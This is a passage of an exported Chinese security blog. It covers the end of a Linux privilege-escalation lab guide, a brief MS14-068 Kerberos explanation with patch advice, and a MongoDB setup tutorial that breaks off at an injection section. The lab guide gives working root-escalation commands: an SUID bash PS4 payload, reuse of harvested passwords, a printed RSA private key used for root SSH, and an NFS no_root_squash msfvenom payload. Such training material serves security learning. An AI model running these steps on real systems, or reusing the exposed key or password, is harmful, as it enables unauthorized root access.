class="line-numbers language-none"><code class="language-none">$ ltrace /usr/local/bin/suid-env 2&gt;&amp;1 | grep service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这和上一步操作都是一样的 下面开始</p><h4 id="5-运行支持bash调试的SUID文件，并分配给我们的有效载荷的PS4变量："><a href="#5-运行支持bash调试的SUID文件，并分配给我们的有效载荷的PS4变量：" class="headerlink" title="5.运行支持bash调试的SUID文件，并分配给我们的有效载荷的PS4变量："></a>5.运行支持bash调试的SUID文件，并分配给我们的有效载荷的PS4变量：</h4><pre class="line-numbers language-none"><code class="language-none">env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643221.png" alt="image-20210701173845361"></p><h4 id="6-使用-p-命令行选项运行-tmp-rootbash文件以获取root："><a href="#6-使用-p-命令行选项运行-tmp-rootbash文件以获取root：" class="headerlink" title="6.使用 -p 命令行选项运行 /tmp/rootbash文件以获取root："></a>6.使用 -p 命令行选项运行 /tmp/rootbash文件以获取root：</h4><pre class="line-numbers language-none"><code class="language-none">/tmp/rootbash -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643222.png" alt="image-20210701173901466"></p><h1 id="0x10-密码-amp-钥匙"><a href="#0x10-密码-amp-钥匙" class="headerlink" title="0x10 密码 &amp;钥匙"></a>0x10 密码 &amp;钥匙</h1><h2 id="前言-17"><a href="#前言-17" class="headerlink" title="前言"></a>前言</h2><h3 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h3><p>虽然这看起来可能很漫长，但弱密码存储和密码重复使用可能是升级权限的简单方法。</p><p>虽然root用户的帐户密码被隐藏起来，并安全地存储在<code>/etc/shadow</code>中</p><p>但其他密码（如用于服务的密码）可能会 以普通文本存储在配置文件中。</p><p>如果根用户将密码重新用于服务，则可能会找到该密码并用于切换到根用户。</p><h3 id="历史文件"><a href="#历史文件" class="headerlink" title="历史文件"></a>历史文件</h3><p>历史文件记录用户在使用某些程序时发出的命令。<br>如果用户将密码键入命令的一部分，此密码可能会存储在历史记录文件中。<br>尝试使用发现ed 密码切换到根</p><h2 id="实操-16"><a href="#实操-16" class="headerlink" title="实操"></a>实操</h2><h3 id="1-查看用户-home目录中隐藏文件的内容，文件名以”历史记录”结尾："><a href="#1-查看用户-home目录中隐藏文件的内容，文件名以”历史记录”结尾：" class="headerlink" title="1.查看用户/home目录中隐藏文件的内容，文件名以”历史记录”结尾："></a>1.查看用户/home目录中隐藏文件的内容，文件名以”历史记录”结尾：</h3><pre class="line-numbers language-none"><code class="language-none">cat ~/.*history | less<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643223.png" alt="image-20210701180324981"></p><p>两次q退出来</p><p>似乎连接到MySQL服务器的用户 </p><pre class="line-numbers language-none"><code class="language-none">rootpassword123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-su-登录"><a href="#2-su-登录" class="headerlink" title="2.su 登录"></a>2.su 登录</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643224.png" alt="image-20210701180528720"></p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><h3 id="前言-18"><a href="#前言-18" class="headerlink" title="前言"></a>前言</h3><p>许多服务和程序使用配置（配置）文件来存储设置。<br>如果服务需要对某件内容进行身份验证，则可能会将凭据存储在配置文件中。<br>如果这些配置文件是可访问的，并且它们存储的密码被特权用户重复使用，我们也许能够使用它作为该用户登录。</p><h3 id="实操-17"><a href="#实操-17" class="headerlink" title="实操"></a>实操</h3><h4 id="1-列出用户家庭目录的内容："><a href="#1-列出用户家庭目录的内容：" class="headerlink" title="1.列出用户家庭目录的内容："></a>1.列出用户家庭目录的内容：</h4><pre class="line-numbers language-none"><code class="language-none">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643225.png" alt="image-20210701180706925"></p><h4 id="2-查看myvpn-ovpn-配置文件的内容："><a href="#2-查看myvpn-ovpn-配置文件的内容：" class="headerlink" title="2.查看myvpn.ovpn 配置文件的内容："></a>2.查看myvpn.ovpn 配置文件的内容：</h4><pre class="line-numbers language-none"><code class="language-none">$ cat myvpn.ovpn <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643226.png" alt="image-20210701180741245"></p><p>发现OpenVPN验证用户的纯文本内容</p><h4 id="3-查看文件内容："><a href="#3-查看文件内容：" class="headerlink" title="3.查看文件内容："></a>3.查看文件内容：</h4><pre class="line-numbers language-none"><code class="language-none">cat /etc/openvpn/auth.txt <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643227.png" alt="image-20210701180850281"></p><h4 id="4-使用su-登录"><a href="#4-使用su-登录" class="headerlink" title="4.使用su 登录"></a>4.使用su 登录</h4><pre class="line-numbers language-none"><code class="language-none">su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643228.png" alt="image-20210701180920818"></p><h2 id="SSH-密钥"><a href="#SSH-密钥" class="headerlink" title="SSH 密钥"></a>SSH 密钥</h2><h3 id="前言-19"><a href="#前言-19" class="headerlink" title="前言"></a>前言</h3><p>可以使用 SSH 密钥而不是密码来验证使用 SSH 的用户。<br>SSH密钥成对提供：一个私钥和一个公钥。私钥应始终保密。<br>如果用户不安全地存储了其私钥，则任何能够读取密钥的用户都可能能够使用它登录到他们的帐户。</p><h3 id="实操-18"><a href="#实操-18" class="headerlink" title="实操"></a>实操</h3><h4 id="1-root用户的ssh密钥存储在-ssh"><a href="#1-root用户的ssh密钥存储在-ssh" class="headerlink" title="1.root用户的ssh密钥存储在.ssh"></a>1.root用户的ssh密钥存储在<code>.ssh</code></h4><pre class="line-numbers language-none"><code class="language-none">ls -l /.ssh <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643229.png" alt="image-20210701181023210"></p><p>并且文件root_key是可读的</p><h4 id="2-查看root-key文件的内容："><a href="#2-查看root-key文件的内容：" class="headerlink" title="2.查看root_key文件的内容："></a>2.查看root_key文件的内容：</h4><pre class="line-numbers language-none"><code class="language-none">cat /.ssh/root_key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643230.png" alt="image-20210701181321426"></p><h3 id="3-将root-key文件复制到kali并加权以便-SSH-接受它："><a href="#3-将root-key文件复制到kali并加权以便-SSH-接受它：" class="headerlink" title="3.将root_key文件复制到kali并加权以便 SSH 接受它："></a>3.将root_key文件复制到kali并加权以便 SSH 接受它：</h3><p>注意格式问题</p><pre class="line-numbers language-none"><code class="language-none">-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNmgLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExlp4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQoOHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HDeV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFETZ36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZYaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244elWUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N76JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzcU7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51ZiSXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GVd+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561ImjQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/okX2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfNWhp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==-----END RSA PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">chmod 600 root_key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643231.png" alt="image-20210701181516464"></p><h4 id="4-使用密钥进行连接到-SSH-服务器"><a href="#4-使用密钥进行连接到-SSH-服务器" class="headerlink" title="4.使用密钥进行连接到 SSH 服务器"></a>4.使用密钥进行连接到 SSH 服务器</h4><pre class="line-numbers language-none"><code class="language-none">ssh -i root_key root@192.168.175.228<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643232.png" alt="image-20210701181613497"></p><h1 id="0x11-NFS"><a href="#0x11-NFS" class="headerlink" title="0x11 NFS"></a>0x11 NFS</h1><h2 id="前言-20"><a href="#前言-20" class="headerlink" title="前言"></a>前言</h2><p>NFS（网络文件系统）是一个流行的分布式文件系统。</p><p>NFS共享在<code>/etc/exports</code>文件中配置。<br>远程用户可以安装共享、访问、创建、修改文件。<br>默认情况下，创建的文件会继承remote用户的ID 和组ID(分别作为所有者和组)，即使它们不存在 NFS 服务器上。 </p><h2 id="显示-NFS-服务器的导出列表："><a href="#显示-NFS-服务器的导出列表：" class="headerlink" title="显示 NFS 服务器的导出列表："></a>显示 NFS 服务器的导出列表：</h2><pre class="line-numbers language-none"><code class="language-none">showmount -e &lt;target&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="类似的nmap脚本："><a href="#类似的nmap脚本：" class="headerlink" title="类似的nmap脚本："></a>类似的nmap脚本：</h2><pre class="line-numbers language-none"><code class="language-none">nmap –sV –script=nfs-showmount &lt;target&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="安装-NFS-共享："><a href="#安装-NFS-共享：" class="headerlink" title="安装 NFS 共享："></a>安装 NFS 共享：</h2><pre class="line-numbers language-none"><code class="language-none">mount -o rw,vers=2 &lt;target&gt;:&lt;share&gt; &lt;local_directory&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Root-Squashing"><a href="#Root-Squashing" class="headerlink" title="Root Squashing"></a>Root Squashing</h2><p>Root Squashing是 NFS如何防止明显的特权升级。<br>如果远程用户是(或声称是)root(uid=0)，NFS将改为”squash”用户，就好像他们是”nobody”用户一样，在”nogroup”组中。<br>虽然此行为是默认的，但它可以禁用！</p><h2 id="no-root-squash"><a href="#no-root-squash" class="headerlink" title="no_root_squash"></a>no_root_squash</h2><p><code>no_root_squash</code>是一个 NFS 配置选项，它关闭root的squash。<br>当包含在可写入的共享配置中时，识别为”root”的远程用户可以作为本地根用户在 NFS 共享上创建文件。</p><h2 id="实操-19"><a href="#实操-19" class="headerlink" title="实操"></a>实操</h2><h3 id="1-检查-etc-exports-的内容，了解具有no-root-squash选项的配置："><a href="#1-检查-etc-exports-的内容，了解具有no-root-squash选项的配置：" class="headerlink" title="1.检查 /etc/exports 的内容，了解具有no_root_squash选项的配置："></a>1.检查 /etc/exports 的内容，了解具有no_root_squash选项的配置：</h3><pre class="line-numbers language-none"><code class="language-none">cat /etc/exports <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643233.png" alt="image-20210701183617720"></p><h3 id="2-确认NFS-共享可用于远程安装："><a href="#2-确认NFS-共享可用于远程安装：" class="headerlink" title="2.确认NFS 共享可用于远程安装："></a>2.确认NFS 共享可用于远程安装：</h3><pre class="line-numbers language-none"><code class="language-none">showmount -e 192.168.1.25 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643234.png" alt="image-20210701183702574"></p><h3 id="3-在kali上创建一个文件夹，并安装-tmp-NFS共享："><a href="#3-在kali上创建一个文件夹，并安装-tmp-NFS共享：" class="headerlink" title="3.在kali上创建一个文件夹，并安装/tmp  NFS共享："></a>3.在kali上创建一个文件夹，并安装/tmp  NFS共享：</h3><pre class="line-numbers language-none"><code class="language-none">mkdir /tmp/nfs mount -o rw,vers=2 192.168.175.228:/tmp /tmp/nfs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643235.png" alt="image-20210701183905563"></p><h3 id="4-使用kali上的root用户生成有效载荷并将其保存到安装的共享中："><a href="#4-使用kali上的root用户生成有效载荷并将其保存到安装的共享中：" class="headerlink" title="4.使用kali上的root用户生成有效载荷并将其保存到安装的共享中："></a>4.使用kali上的root用户生成有效载荷并将其保存到安装的共享中：</h3><pre class="line-numbers language-none"><code class="language-none">msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643236.png" alt="image-20210701184010960"></p><h3 id="5-确保文件具有-SUID-位集，并且每个用户都可执行："><a href="#5-确保文件具有-SUID-位集，并且每个用户都可执行：" class="headerlink" title="5.确保文件具有 SUID 位集，并且每个用户都可执行："></a>5.确保文件具有 SUID 位集，并且每个用户都可执行：</h3><pre class="line-numbers language-none"><code class="language-none">chmod +xs /tmp/nfs/shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643237.png" alt="image-20210701184121840"></p><h3 id="6-在目标机器上，执行文件以获取root："><a href="#6-在目标机器上，执行文件以获取root：" class="headerlink" title="6.在目标机器上，执行文件以获取root："></a>6.在目标机器上，执行文件以获取root：</h3><pre class="line-numbers language-none"><code class="language-none">/tmp/shell.elf bash-4.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643238.png" alt="image-20210701184058216"></p><h2 id="权限提升总结"><a href="#权限提升总结" class="headerlink" title="权限提升总结"></a>权限提升总结</h2><pre class="line-numbers language-none"><code class="language-none">1.信息收集(id, whoami)2.运行Linux Smart Enumeration,并增加级别。3.运行LinEnum和其他脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 快速查找home中的文件 目录和其他公共位置(例如/var，/backup，/var/logs)</p><p>注意：如果用户有一个历史文件，它可能有  重要的信息，比如命令或者 密码 </p><p>Sudo，Cron jobs，SUID文件</p><p>好好看看root进程，列举它们的版本，检查可以转发到的内部端口</p><p>最后考虑内核漏洞，进行提权</p><p>希望此文可以帮到大家，加油！！</p>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux提权小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MS14-068</title>
      <link href="/2021/10/28/ms14-068/"/>
      <url>/2021/10/28/ms14-068/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><pre class="line-numbers language-none"><code class="language-none">1. 作为普通用户向域控请求一个没有PAC的Kerberos TGT认证的票据，域控会返回一个TGT（不包含PAC，PAC通常包含有用户组中的成员关系）2. 生成一个伪造的PAC，因为没有密钥，所以生成的PAC"被标记”有MD5算法，而不是带有域用户密码数据的HMAC_MD5类型。3. 把伪造的PAC结合上TGT构造认证数据，作为TGS服务的一部分发送到域控。4. 域控会混淆构造的数据，所以直接丢弃之前用户发送没带有PAC的TGT，然后新构造一个TGT并用自己的认证数据插入到伪造的PAC当中，再把新TGT发送给用户5. 这样带有伪造PAC的TGT就能使用户成为有漏洞域控上的域管理员。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单来讲，攻击者可以在五分钟内重写有效的Kerberos TGT 认证票据并且成为域管理员(企业管理员)</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>MS14-068的利用工具，叫Kekeo</p><p><a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><pre class="line-numbers language-none"><code class="language-none">1.确保机器在运行DCPromo命令(被提升为域控)前就安装上了KB3011780补丁#PowerShell命令自查:get-hotfix 30117802.同时，为机器开启自动安装关键补丁的选项<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 打域控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MS14-068 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB小结</title>
      <link href="/2021/10/28/mongodb/"/>
      <url>/2021/10/28/mongodb/</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h1><h2 id="默认端口"><a href="#默认端口" class="headerlink" title="默认端口"></a>默认端口</h2><p>默认端口–&gt;27017–&gt;mongod和 mongos实例的默认端口。你可以通过port或-port改变该端口</p><p>默认端口–&gt;27018–&gt;设置–shardsvr运行变量或在配置文件里设置clusterRole为shardsvr时的默认端口</p><h2 id="Windows平台安装MongoDB"><a href="#Windows平台安装MongoDB" class="headerlink" title="Windows平台安装MongoDB"></a>Windows平台安装MongoDB</h2><p>官网下载地址：<a href="https://www.mongodb.com/try/download/community">https://www.mongodb.com/try/download/community</a></p><p>我这边在Windows环境下载的</p><p><img src="https://img-blog.csdnimg.cn/20210414081629629.png" alt="在这里插入图片描述"></p><p>搞的是最新版的</p><p>默认安装就可以了</p><p>安装完成就打开了</p><p><img src="https://img-blog.csdnimg.cn/20210414082431111.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210414082457605.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210414082526916.png" alt="在这里插入图片描述"></p><p>默认没啥字密码 直接连接就可以</p><p><img src="https://img-blog.csdnimg.cn/20210414082600249.png" alt="在这里插入图片描述"></p><p>到安装目录去了解一下</p><p><img src="https://img-blog.csdnimg.cn/20210414082747337.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210414082806545.png" alt="在这里插入图片描述"></p><ul><li>mongo.exe # MongoDB客户端软件</li><li>mongod.exe # MongoDB服务端软件</li><li>mongod.cfg      # MongDb的配置文件</li></ul><p>解析一下MongDb的配置文件</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#系统日志相关systemLog<span class="token operator">:</span>destination<span class="token operator">:</span> file #使用文件存储日志path<span class="token operator">:</span>C：mongodb\Log\mongodb<span class="token punctuation">.</span>log#日志位置<span class="token operator">!</span><span class="token punctuation">[</span>在这里插入图片描述<span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token operator">:</span><span class="token comment">//img-blog.csdnimg.cn/20210414153819455.png)</span>LogAppend<span class="token operator">:</span>true#  是否以追加的形式记录日志#数据相关storage<span class="token operator">:</span>journal<span class="token operator">:</span> #回滚日志enabled true dbPath<span class="token operator">:</span>C：mongodb\data #数据存储目录#网络配置相关net<span class="token operator">:</span>port：<span class="token number">27017</span>  #默认端口bindIp：<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>  #绑定ip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里这个绑定ip是本地的 </p><p>我们修改一下 </p><p><img src="https://img-blog.csdnimg.cn/20210414153913146.png" alt="在这里插入图片描述"></p><p>碰到权限问题 自己处理一下</p><p>然后去配置环境变量</p><p>把bin目录的路径 添加到环境变量中的系统变量中的Path中</p><p><img src="https://img-blog.csdnimg.cn/20210414154255592.png" alt="在这里插入图片描述"></p><p>就可以了 </p><p>测试一下</p><p><img src="https://img-blog.csdnimg.cn/20210414154822690.png" alt="在这里插入图片描述"></p><p>管理Mongodb数据库的话</p><p>也是有工具的 自己去下载一下</p><p>navicat150_mongodb_cs_x64</p><p>robo3t-1.4.3-windows-x86_64-48f7dfd</p><p>都是可以的 安装的话 默认然后一直下一步就好了</p><h2 id="kali下安装MongoDB"><a href="#kali下安装MongoDB" class="headerlink" title="kali下安装MongoDB"></a>kali下安装MongoDB</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">wget <span class="token operator">-</span>qO <span class="token operator">-</span> https<span class="token operator">:</span><span class="token comment">//www.mongodb.org/static/pgp/server-4.4.asc | sudo apt-key add -</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>应该要响应OK的</p><p><img src="https://img-blog.csdnimg.cn/20210414171040842.png" alt="在这里插入图片描述"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">echo <span class="token string">"deb http://repo.mongodb.org/apt/debian buster/mongodb-org/4.4 main"</span> <span class="token operator">|</span> sudo tee <span class="token operator">/</span>etc<span class="token operator">/</span>apt<span class="token operator">/</span>sources<span class="token punctuation">.</span>list<span class="token punctuation">.</span>d<span class="token operator">/</span>mongodb<span class="token operator">-</span>org<span class="token operator">-</span><span class="token number">4.4</span><span class="token punctuation">.</span>list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210414172047978.png" alt="在这里插入图片描述"><br>sudo apt-get update</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">proxychains apt<span class="token operator">-</span>get install <span class="token operator">-</span>y mongodb<span class="token operator">-</span>org <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这边要科学上网才可以</p><p>这个我就不说了</p><p>启动命令</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">sudo systemctl start mongod<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看一下端口</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">netstat <span class="token operator">-</span>nultp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210414174305969.png" alt="在这里插入图片描述"></p><p>修改登录IP  因为我们要远程登录的嘛</p><p>找一下它的配置文件</p><p><img src="https://img-blog.csdnimg.cn/20210414174531888.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210414174614960.png" alt="在这里插入图片描述"><br>重新启动Mongodb数据库</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">sudo systemctl restart mongod<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Windows远程连接Kali</p><p><img src="https://img-blog.csdnimg.cn/20210414175303240.png" alt="在这里插入图片描述"><br>填写kali的IP</p><p>测试连接一下 是成功的</p><p><img src="https://img-blog.csdnimg.cn/20210414175348260.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210414175632808.png" alt="在这里插入图片描述"><br>ok这就连接成功了</p><h2 id="简单使用一下"><a href="#简单使用一下" class="headerlink" title="简单使用一下"></a>简单使用一下</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">mongo 进来show dbs 查库use a001 创建一个库这里要注意 只有这个库下有东西 查库的时候 才会显示现在还是虚的db 查看当前在哪个库下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">把data数据插入到a001数据库下db<span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"user"</span><span class="token operator">:</span><span class="token string">"test1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210414180136422.png" alt="在这里插入图片描述"></p><p>查数据库下的东西</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">db<span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210414180224127.png" alt="在这里插入图片描述"></p><p>因为插入的是data数据</p><p>多来几条数据</p><p>这里注意值可以一样 但是键是不可以一样的</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">db<span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"user2"</span><span class="token operator">:</span><span class="token string">"test1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>db<span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"user3"</span><span class="token operator">:</span><span class="token string">"test1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>db<span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"user4"</span><span class="token operator">:</span><span class="token string">"test1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210414180510785.png" alt="在这里插入图片描述"><br>删除数据</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">db<span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"user4"</span><span class="token operator">:</span><span class="token string">"test1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210414180628256.png" alt="在这里插入图片描述"><br>ok 就这样了</p><p>删除集合  </p><p>比如删除data集合用drop()方法</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">show collections<span class="token punctuation">;</span>db<span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">drop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>show collections<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210414180831544.png" alt="在这里插入图片描述"></p><p>删除目前使用的数据库</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">db<span class="token punctuation">.</span><span class="token function">dropDatabase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210414180925798.png" alt="在这里插入图片描述"></p><p>使 PHP Web应用程序能够使用 MongoDB，我们需要安装PHP驱动程序</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install php-pearapt-get install php-mongodb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="注入MongoDB"><a href="#注入MongoDB" class="headerlink" title="注入MongoDB"></a>注入MongoDB</h2><p>这边我用墨者学院的练习题进行演示一下</p><p>免费的</p><p>地址：<a 